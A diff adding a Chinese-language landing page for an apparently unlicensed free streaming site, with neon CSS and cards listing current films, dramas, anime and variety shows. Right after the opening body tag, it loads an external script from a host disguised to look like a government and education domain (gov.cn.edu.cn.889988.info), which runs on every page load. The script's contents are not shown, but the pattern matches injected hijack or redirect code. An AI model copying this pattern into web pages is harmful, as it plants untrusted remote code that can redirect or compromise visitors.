@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>免费看影视 - 全网高清影视免费在线观看平台</title>
+<meta name="description" content="免费看影视提供最新电影、电视剧、动漫、综艺高清在线免费观看，每日更新，无需注册，无广告干扰，畅享海量影视资源。">
+<meta name="keywords" content="免费看影视,免费电影,免费电视剧,在线观看,高清影视,影视大全">
+<style>
+/* ===== 全局重置 ===== */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    font-family: 'PingFang SC', 'Microsoft YaHei', -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #0a0a0a;
+    color: #e0e0e0;
+    line-height: 1.7;
+    overflow-x: hidden;
+}
+a { text-decoration: none; color: inherit; transition: all 0.3s ease; }
+img { max-width: 100%; height: auto; display: block; }
+ul { list-style: none; }
+
+/* ===== 霓虹灯风格头部 ===== */
+.header {
+    background: rgba(10, 10, 10, 0.95);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid rgba(0, 255, 255, 0.2);
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    z-index: 1000;
+    padding: 0 1rem;
+}
+.nav-inner {
+    max-width: 1400px;
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    height: 65px;
+}
+.logo {
+    font-size: 1.4rem;
+    font-weight: 800;
+    background: linear-gradient(90deg, #00ffff, #ff00ff, #00ffff);
+    background-size: 200% auto;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: gradientShift 3s linear infinite;
+}
+@keyframes gradientShift {
+    0% { background-position: 0% center; }
+    100% { background-position: 200% center; }
+}
+.nav-links {
+    display: flex;
+    gap: 2rem;
+}
+.nav-links a {
+    font-size: 0.95rem;
+    font-weight: 500;
+    color: #b0b0b0;
+    position: relative;
+    padding: 0.3rem 0;
+}
+.nav-links a::after {
+    content: '';
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    width: 0;
+    height: 2px;
+    background: linear-gradient(90deg, #00ffff, #ff00ff);
+    transition: width 0.3s;
+}
+.nav-links a:hover { color: #fff; }
+.nav-links a:hover::after { width: 100%; }
+
+/* ===== 首页Hero区 - 暗黑霓虹风 ===== */
+.hero-section {
+    margin-top: 65px;
+    min-height: 90vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+    background: radial-gradient(ellipse at 50% 50%, #1a0a2e 0%, #0a0a0a 70%);
+}
+.hero-bg-grid {
+    position: absolute;
+    inset: 0;
+    background-image: 
+        linear-gradient(rgba(0,255,255,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,255,0.03) 1px, transparent 1px);
+    background-size: 60px 60px;
+    animation: gridMove 20s linear infinite;
+}
+@keyframes gridMove {
+    0% { transform: translate(0, 0); }
+    100% { transform: translate(60px, 60px); }
+}
+.hero-content {
+    text-align: center;
+    z-index: 2;
+    padding: 2rem;
+    max-width: 800px;
+}
+.hero-badge {
+    display: inline-block;
+    border: 1px solid rgba(0, 255, 255, 0.4);
+    color: #00ffff;
+    padding: 0.4rem 1.2rem;
+    border-radius: 50px;
+    font-size: 0.8rem;
+    margin-bottom: 1.5rem;
+    letter-spacing: 2px;
+}
+.hero-title {
+    font-size: clamp(2rem, 5vw, 3.5rem);
+    font-weight: 900;
+    line-height: 1.2;
+    margin-bottom: 1rem;
+    color: #fff;
+}
+.hero-title span {
+    background: linear-gradient(135deg, #00ffff, #ff00ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+.hero-sub {
+    font-size: 1.1rem;
+    color: #888;
+    margin-bottom: 2rem;
+}
+.hero-actions {
+    display: flex;
+    gap: 1rem;
+    justify-content: center;
+    flex-wrap: wrap;
+}
+.btn-primary {
+    background: linear-gradient(135deg, #00ffff, #0099ff);
+    color: #000;
+    padding: 0.9rem 2.5rem;
+    border-radius: 50px;
+    font-weight: 700;
+    font-size: 1rem;
+    box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
+}
+.btn-primary:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 0 50px rgba(0, 255, 255, 0.5);
+}
+.btn-outline {
+    border: 1px solid rgba(255,255,255,0.3);
+    color: #fff;
+    padding: 0.9rem 2.5rem;
+    border-radius: 50px;
+    font-weight: 600;
+}
+.btn-outline:hover {
+    border-color: #00ffff;
+    color: #00ffff;
+}
+
+/* ===== 通用区块 ===== */
+.section-block {
+    padding: 4rem 1rem;
+    max-width: 1400px;
+    margin: 0 auto;
+}
+.section-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 2rem;
+    flex-wrap: wrap;
+    gap: 1rem;
+}
+.section-title-group {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+}
+.section-icon {
+    width: 40px;
+    height: 40px;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.2rem;
+}
+.section-title {
+    font-size: 1.6rem;
+    font-weight: 700;
+    color: #fff;
+}
+.section-more {
+    color: #00ffff;
+    font-size: 0.9rem;
+}
+.section-more:hover { text-decoration: underline; }
+
+/* ===== 电影栏目 - 玻璃拟态卡片 ===== */
+#movies .section-icon { background: rgba(0,255,255,0.15); }
+.movie-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 1.5rem;
+}
+.movie-card {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 16px;
+    overflow: hidden;
+    backdrop-filter: blur(10px);
+    transition: all 0.4s ease;
+    cursor: pointer;
+}
+.movie-card:hover {
+    transform: translateY(-8px) scale(1.02);
+    border-color: rgba(0,255,255,0.3);
+    box-shadow: 0 20px 40px rgba(0,0,0,0.4), 0 0 20px rgba(0,255,255,0.1);
+}
+.movie-poster {
+    position: relative;
+    overflow: hidden;
+}
+.movie-poster img {
+    width: 100%;
+    height: 280px;
+    object-fit: cover;
+    transition: transform 0.5s;
+}
+.movie-card:hover .movie-poster img {
+    transform: scale(1.08);
+}
+.movie-overlay {
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
+    display: flex;
+    align-items: flex-end;
+    padding: 1rem;
+    opacity: 0;
+    transition: opacity 0.3s;
+}
+.movie-card:hover .movie-overlay { opacity: 1; }
+.play-btn {
+    width: 50px;
+    height: 50px;
+    border-radius: 50%;
+    background: rgba(0,255,255,0.9);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto;
+    color: #000;
+    font-size: 1.2rem;
+}
+.movie-info { padding: 1rem; }
+.movie-name {
+    font-size: 1rem;
+    font-weight: 600;
+    color: #fff;
+    margin-bottom: 0.4rem;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+.movie-detail {
+    font-size: 0.8rem;
+    color: #666;
+    display: flex;
+    justify-content: space-between;
+}
+
+/* ===== 电视剧栏目 - 横向滚动条 ===== */
+#tv { background: linear-gradient(180deg, #0a0a0a, #0f0f1a); }
+#tv .section-icon { background: rgba(255,0,255,0.15); }
+.tv-scroll-wrapper {
+    position: relative;
+}
+.tv-scroll {
+    display: flex;
+    gap: 1.5rem;
+    overflow-x: auto;
+    padding-bottom: 1.5rem;
+    scroll-snap-type: x mandatory;
+}
+.tv-scroll::-webkit-scrollbar { height: 4px; }
+.tv-scroll::-webkit-scrollbar-track { background: rgba(255,255,255,0.05); border-radius: 2px; }
+.tv-scroll::-webkit-scrollbar-thumb { background: rgba(255,0,255,0.4); border-radius: 2px; }
+.tv-card {
+    flex: 0 0 320px;
+    scroll-snap-align: start;
+    background: rgba(255,255,255,0.02);
+    border: 1px solid rgba(255,255,255,0.06);
+    border-radius: 12px;
+    overflow: hidden;
+    display: flex;
+    transition: all 0.3s;
+}
+.tv-card:hover {
+    border-color: rgba(255,0,255,0.3);
+    background: rgba(255,255,255,0.05);
+}
+.tv-card-poster {
+    width: 120px;
+    flex-shrink: 0;
+}
+.tv-card-poster img {
+    width: 100%;
+    height: 160px;
+    object-fit: cover;
+}
+.tv-card-body {
+    padding: 1rem;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+}
+.tv-card-title {
+    font-size: 0.95rem;
+    font-weight: 600;
+    color: #fff;
+    margin-bottom: 0.3rem;
+}
+.tv-card-desc {
+    font-size: 0.75rem;
+    color: #666;
+    line-height: 1.5;
+    display: -webkit-box;
+    -webkit-line-clamp: 3;
+    -webkit-box-orient: vertical;
+    overflow: hidden;
+}
+.tv-card-tag {
+    display: inline-block;
+    background: rgba(255,0,255,0.15);
+    color: #ff00ff;
+    padding: 0.2rem 0.6rem;
+    border-radius: 4px;
+    font-size: 0.7rem;
+}
+
+/* ===== 动漫栏目 - 赛博朋克网格 ===== */
+#anime { background: #0a0a0a; }
+#anime .section-icon { background: rgba(255,255,0,0.15); }
+.anime-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+    gap: 1.5rem;
+}
+.anime-card {
+    position: relative;
+    border-radius: 12px;
+    overflow: hidden;
+    aspect-ratio: 3/4;
+}
+.anime-card img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    transition: transform 0.5s;
+}
+.anime-card:hover img { transform: scale(1.1); }
+.anime-card-overlay {
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(to top, rgba(0,0,0,0.95) 0%, rgba(0,0,0,0.4) 50%, transparent 100%);
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-end;
+    padding: 1rem;
+}
+.anime-card-title {
+    font-size: 0.95rem;
+    font-weight: 600;
+    color: #fff;
+    margin-bottom: 0.3rem;
+}
+.anime-card-ep {
+    font-size: 0.75rem;
+    color: #ff0;
+}
+.anime-card-ep span {
+    background: rgba(255,255,0,0.2);
+    padding: 0.1rem 0.5rem;
+    border-radius: 3px;
+}
+
+/* ===== 综艺栏目 - 杂志排版 ===== */
+#variety { background: linear-gradient(180deg, #0f0f1a, #0a0a0a); }
+#variety .section-icon { background: rgba(0,255,0,0.15); }
+.variety-layout {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1.5rem;
+}
+.variety-main {
+    grid-row: span 2;
+    border-radius: 16px;
+    overflow: hidden;
+    position: relative;
+    min-height: 400px;
+}
+.variety-main img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+.variety-main-overlay {
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(to top, rgba(0,0,0,0.9), transparent 60%);
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-end;
+    padding: 2rem;
+}
+.variety-main-title {
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 0.5rem;
+}
+.variety-main-desc {
+    font-size: 0.9rem;
+    color: #aaa;
+}
+.variety-sub {
+    border-radius: 12px;
+    overflow: hidden;
+    position: relative;
+    min-height: 190px;
+}
+.variety-sub img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    transition: transform 0.4s;
+}
+.variety-sub:hover img { transform: scale(1.05); }
+.variety-sub-overlay {
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(to top, rgba(0,0,0,0.85), transparent 70%);
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-end;
+    padding: 1.2rem;
+}
+.variety-sub-title {
+    font-size: 1rem;
+    font-weight: 600;
+    color: #fff;
+}
+
+/* ===== 关于我们 - 数据面板 ===== */
+#about { background: #0a0a0a; }
+.about-panel {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 2rem;
+    align-items: center;
+}
+.about-text h2 {
+    font-size: 1.8rem;
+    font-weight: 800;
+    color: #fff;
+    margin-bottom: 1.5rem;
+}
+.about-text p {
+    font-size: 0.95rem;
+    color: #777;
+    margin-bottom: 1rem;
+    line-height: 1.8;
+}
+.about-text .highlight {
+    color: #00ffff;
+    font-weight: 600;
+}
+.stats-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1rem;
+}
+.stat-card {
+    background: rgba(255,255,255,0.02);
+    border: 1px solid rgba(255,255,255,0.06);
+    border-radius: 12px;
+    padding: 1.5rem;
+    text-align: center;
+    transition: all 0.3s;
+}
+.stat-card:hover {
+    border-color: rgba(0,255,255,0.3);
+    background: rgba(0,255,255,0.03);
+}
+.stat-num {
+    font-size: 2rem;
+    font-weight: 800;
+    background: linear-gradient(135deg, #00ffff, #ff00ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 0.3rem;
+}
+.stat-label {
+    font-size: 0.8rem;
+    color: #666;
+}
+
+/* ===== 底部 ===== */
+.footer {
+    background: #050505;
+    border-top: 1px solid rgba(255,255,255,0.05);
+    padding: 3rem 1rem 2rem;
+}
+.footer-inner {
+    max-width: 1400px;
+    margin: 0 auto;
+}
+.footer-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    flex-wrap: wrap;
+    gap: 2rem;
+    margin-bottom: 2rem;
+}
+.footer-brand .logo {
+    font-size: 1.2rem;
+    margin-bottom: 0.5rem;
+}
+.footer-brand p {
+    font-size: 0.8rem;
+    color: #555;
+}
+.footer-nav {
+    display: flex;
+    gap: 3rem;
+    flex-wrap: wrap;
+}
+.footer-nav-group h4 {
+    font-size: 0.9rem;
+    color: #fff;
+    margin-bottom: 0.8rem;
+}
+.footer-nav-group a {
+    display: block;
+    font-size: 0.8rem;
+    color: #555;
+    margin-bottom: 0.5rem;
+}
+.footer-nav-group a:hover { color: #00ffff; }
+.footer-bottom {
+    border-top: 1px solid rgba(255,255,255,0.05);
+    padding-top: 1.5rem;
+    text-align: center;
+}
+.footer-bottom p {
+    font-size: 0.75rem;
+    color: #444;
+}
+
+/* ===== 移动端适配 ===== */
+@media (max-width: 768px) {
+    .nav-links { display: none; }
+    .hero-section { min-height: 70vh; margin-top: 65px; }
+    .hero-title { font-size: 1.8rem; }
+    .hero-sub { font-size: 0.9rem; }
+    .hero-actions { flex-direction: column; align-items: center; }
+    .section-block { padding: 2.5rem 1rem; }
+    .movie-grid { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 1rem; }
+    .movie-poster img { height: 200px; }
+    .tv-card { flex: 0 0 280px; }
+    .tv-card-poster { width: 100px; }
+    .tv-card-poster img { height: 140px; }
+    .anime-grid { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); }
+    .variety-layout { grid-template-columns: 1fr; }
+    .variety-main { grid-row: auto; min-height: 250px; }
+    .variety-sub { min-height: 180px; }
+    .about-panel { grid-template-columns: 1fr; }
+    .stats-grid { grid-template-columns: 1fr 1fr; }
+    .footer-top { flex-direction: column; }
+    .footer-nav { gap: 1.5rem; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 头部导航 -->
+<header class="header">
+    <div class="nav-inner">
+        <div class="logo">免费看影视</div>
+        <nav class="nav-links">
+            <a href="#home">首页</a>
+            <a href="#movies">电影</a>
+            <a href="#tv">电视剧</a>
+            <a href="#anime">动漫</a>
+            <a href="#variety">综艺</a>
+            <a href="#about">关于</a>
+        </nav>
+    </div>
+</header>
+
+<!-- 首页Hero -->
+<section class="hero-section" id="home">
+    <div class="hero-bg-grid"></div>
+    <div class="hero-content">
+        <div class="hero-badge">✨ 全网影视免费看</div>
+        <h1 class="hero-title">免费看影视<br><span>海量高清 · 每日更新</span></h1>
+        <p class="hero-sub">最新电影、热播剧、动漫综艺一网打尽，无需注册，无广告，极速播放</p>
+        <div class="hero-actions">
+            <a href="#movies" class="btn-primary">立即观看</a>
+            <a href="#about" class="btn-outline">了解更多</a>
+        </div>
+    </div>
+</section>
+
+<!-- 电影栏目 -->
+<section class="section-block" id="movies">
+    <div class="section-header">
+        <div class="section-title-group">
+            <div class="section-icon">🎬</div>
+            <h2 class="section-title">最新电影</h2>
+        </div>
+        <a href="#" class="section-more">查看更多 →</a>
+    </div>
+    <div class="movie-grid">
+        <div class="movie-card">
+            <div class="movie-poster">
+                <img src="https://picsum.photos/400/560?random=20" alt="电影1">
+                <div class="movie-overlay"><div class="play-btn">▶</div></div>
+            </div>
+            <div class="movie-info">
+                <div class="movie-name">流浪地球3</div>
+                <div class="movie-detail"><span>科幻/冒险</span><span>9.2分</span></div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">
+                <img src="https://picsum.photos/400/560?random=21" alt="电影2">
+                <div class="movie-overlay"><div class="play-btn">▶</div></div>
+            </div>
+            <div class="movie-info">
+                <div class="movie-name">封神第二部</div>
+                <div class="movie-detail"><span>奇幻/动作</span><span>8.8分</span></div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">
+                <img src="https://picsum.photos/400/560?random=22" alt="电影3">
+                <div class="movie-overlay"><div class="play-btn">▶</div></div>
+            </div>
+            <div class="movie-info">
+                <div class="movie-name">热辣滚烫</div>
+                <div class="movie-detail"><span>喜剧/剧情</span><span>8.5分</span></div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">
+                <img src="https://picsum.photos/400/560?random=23" alt="电影4">
+                <div class="movie-overlay"><div class="play-btn">▶</div></div>
+            </div>
+            <div class="movie-info">
+                <div class="movie-name">飞驰人生2</div>
+                <div class="movie-detail"><span>喜剧/运动</span><span>8.7分</span></div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">
+                <img src="https://picsum.photos/400/560?random=24" alt="电影5">
+                <div class="movie-overlay"><div class="play-btn">▶</div></div>
+            </div>
+            <div class="movie-info">
+                <div class="movie-name">第二十条</div>
+                <div class="movie-detail"><span>剧情/家庭</span><span>9.0分</span></div>
+            </div>
+        </div>
+        <div class="movie-card">
+            <div class="movie-poster">
+                <img src="https://picsum.photos/400/560?random=25" alt="电影6">
+                <div class="movie-overlay"><div class="play-btn">▶</div></div>
+            </div>
+            <div class="movie-info">
+                <div class="movie-name">熊出没·逆转时空</div>
+                <div class="movie-detail"><span>动画/冒险</span><span>8.3分</span></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 电视剧栏目 -->
+<section class="section-block" id="tv">
+    <div class="section-header">
+        <div class="section-title-group">
+            <div class="section-icon">📺</div>
+            <h2 class="section-title">热播电视剧</h2>
+        </div>
+        <a href="#" class="section-more">查看更多 →</a>
+    </div>
+    <div class="tv-scroll-wrapper">
+        <div class="tv-scroll">
+            <div class="tv-card">
+                <div class="tv-card-poster"><img src="https://picsum.photos/240/320?random=30" alt="电视剧1"></div>
+                <div class="tv-card-body">
+                    <div>
+                        <div class="tv-card-title">庆余年 第二季</div>
+                        <div class="tv-card-desc">范闲重返京都，面对新的政治格局和家族纷争，他将如何破局？</div>
+                    </div>
+                    <div class="tv-card-tag">更新至32集</div>
+                </div>
+            </div>
+            <div class="tv-card">
+                <div class="tv-card-poster"><img src="https://picsum.photos/240/320?random=31" alt="电视剧2"></div>
+                <div class="tv-card-body">
+                    <div>
+                        <div class="tv-card-title">与凤行</div>
+                        <div class="tv-card-desc">灵界碧苍王沈璃与人间王爷行止的仙侠爱情故事。</div>
+                    </div>
+                    <div class="tv-card-tag">全39集</div>
+                </div>
+            </div>
+            <div class="tv-card">
+                <div class="tv-card-poster"><img src="https://picsum.photos/240/320?random=32" alt="电视剧3"></div>
+                <div class="tv-card-body">
+                    <div>
+                        <div class="tv-card-title">繁花</div>
+                        <div class="tv-card-desc">90年代上海滩，阿宝从弄堂少年到商界传奇的奋斗历程。</div>
+                    </div>
+                    <div class="tv-card-tag">全30集</div>
+                </div>
+            </div>
+            <div class="tv-card">
+                <div class="tv-card-poster"><img src="https://picsum.photos/240/320?random=33" alt="电视剧4"></div>
+                <div class="tv-card-body">
+                    <div>
+                        <div class="tv-card-title">南来北往</div>
+                        <div class="tv-card-desc">铁路公安干警几十年如一日守护列车安全的感人故事。</div>
+                    </div>
+                    <div class="tv-card-tag">全48集</div>
+                </div>
+            </div>
+            <div class="tv-card">
+                <div class="tv-card-poster"><img src="https://picsum.photos/240/320?random=34" alt="电视剧5"></div>
+                <div class="tv-card-body">
+                    <div>
+                        <div class="tv-card-title">玫瑰的故事</div>
+                        <div class="tv-card-desc">黄亦玫跨越二十年的成长故事，展现女性独立与自我追寻。</div>
+                    </div>
+                    <div class="tv-card-tag">更新至28集</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 动漫栏目 -->
+<section class="section-block" id="anime">
+    <div class="section-header">
+        <div class="section-title-group">
+            <div class="section-icon">🎨</div>
+            <h2 class="section-title">动漫更新</h2>
+        </div>
+        <a href="#" class="section-more">查看更多 →</a>
+    </div>
+    <div class="anime-grid">
+        <div class="anime-card">
+            <img src="https://picsum.photos/300/400?random=40" alt="动漫1">
+            <div class="anime-card-overlay">
+                <div class="anime-card-title">咒术回战 第二季</div>
+                <div class="anime-card-ep"><span>更新至23集</span></div>
+            </div>
+        </div>
+        <div class="anime-card">
+            <img src="https://picsum.photos/300/400?random=41" alt="动漫2">
+            <div class="anime-card-overlay">
+                <div class="anime-card-title">葬送的芙莉莲</div>
+                <div class="anime-card-ep"><span>更新至20集</span></div>
+            </div>
+        </div>
+        <div class="anime-card">
+            <img src="https://picsum.photos/300/400?random=42" alt="动漫3">
+            <div class="anime-card-overlay">
+                <div class="anime-card-title">间谍过家家</div>
+                <div class="anime-card-ep"><span>更新至12集</span></div>
+            </div>
+        </div>
+        <div class="anime-card">
+            <img src="https://picsum.photos/300/400?random=43" alt="动漫4">
+            <div class="anime-card-overlay">
+                <div class="anime-card-title">鬼灭之刃 锻刀村篇</div>
+                <div class="anime-card-ep"><span>全11集</span></div>
+            </div>
+        </div>
+        <div class="anime-card">
+            <img src="https://picsum.photos/300/400?random=44" alt="动漫5">
+            <div class="anime-card-overlay">
+                <div class="anime-card-title">进击的巨人 最终季</div>
+                <div class="anime-card-ep"><span>全12集</span></div>
+            </div>
+        </div>
+        <div class="anime-card">
+            <img src="https://picsum.photos/300/400?random=45" alt="动漫6">
+            <div class="anime-card-overlay">
+                <div class="anime-card-title">伍六七 第四季</div>
+                <div class="anime-card-ep"><span>更新至10集</span></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 综艺栏目 -->
+<section class="section-block" id="variety">
+    <div class="section-header">
+        <div class="section-title-group">
+            <div class="section-icon">🎤</div>
+            <h2 class="section-title">热门综艺</h2>
+        </div>
+        <a href="#" class="section-more">查看更多 →</a>
+    </div>
+    <div class="variety-layout">
+        <div class="variety-main">
+            <img src="https://picsum.photos/800/600?random=50" alt="综艺主推">
+            <div class="variety-main-overlay">
+                <div class="variety-main-title">奔跑吧·生态篇</div>
+                <div class="variety-main-desc">全新户外竞技真人秀，成员们前往各地完成环保主题挑战任务，爆笑不断。</div>
+            </div>
+        </div>
+        <div class="variety-sub">
+            <img src="https://picsum.photos/400/300?random=51" alt="综艺2">
+            <div class="variety-sub-overlay">
+                <div class="variety-sub-title">歌手2024</div>
+            </div>
+        </div>
+        <div class="variety-sub">
+            <img src="https://picsum.photos/400/300?random=52" alt="综艺3">
+            <div class="variety-sub-overlay">
+                <div class="variety-sub-title">花儿与少年 第五季</div>
+            </div>
+        </div>
+        <div class="variety-sub">
+            <img src="https://picsum.photos/400/300?random=53" alt="综艺4">
+            <div class="variety-sub-overlay">
+                <div class="variety-sub-title">向往的生活 第七季</div>
+            </div>
+        </div>
+        <div class="variety-sub">
+            <img src="https://picsum.photos/400/300?random=54" alt="综艺5">
+            <div class="variety-sub-overlay">
+                <div class="variety-sub-title">极限挑战 第十季</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 关于我们 -->
+<section class="section-block" id="about">
+    <div class="about-panel">
+        <div class="about-text">
+            <h2>关于 免费看影视</h2>
+            <p>我们是一个专注于提供<span class="highlight">免费高清影视资源</span>的在线平台，致力于让每一位用户都能轻松享受优质影视内容。</p>
+            <p>网站涵盖电影、电视剧、动漫、综艺等全品类资源，每日同步更新，支持多分辨率切换，适配手机、平板、电脑等各种设备。</p>
+            <p>访问地址：<span class="highlight">https://mianfeikanyingshi-h5.github.io</span></p>
+        </div>
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-num">20000+</div>
+                <div class="stat-label">影视资源</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-num">4K</div>
+                <div class="stat-label">超清画质</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-num">0</div>
+                <div class="stat-label">广告干扰</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-num">24h</div>
+                <div class="stat-label">每日更新</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 底部 -->
+<footer class="footer">
+    <div class="footer-inner">
+        <div class="footer-top">
+            <div class="footer-brand">
+                <div class="logo">免费看影视</div>
+                <p>全网高清影视免费在线观看</p>
+            </div>
+            <div class="footer-nav">
+                <div class="footer-nav-group">
+                    <h4>栏目导航</h4>
+                    <a href="#movies">电影</a>
+                    <a href="#tv">电视剧</a>
+                    <a href="#anime">动漫</a>
+                    <a href="#variety">综艺</a>
+                </div>
+                <div class="footer-nav-group">
+                    <h4>关于我们</h4>
+                    <a href="#about">平台介绍</a>
+                    <a href="#">联系方式</a>
+                </div>
+                <div class="footer-nav-group">
+                    <h4>快速链接</h4>
+                    <a href="#home">首页</a>
+                    <a href="#">留言反馈</a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2024 免费看影视 | 网站网址: https://mianfeikanyingshi-h5.github.io | 保留所有权利</p>
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
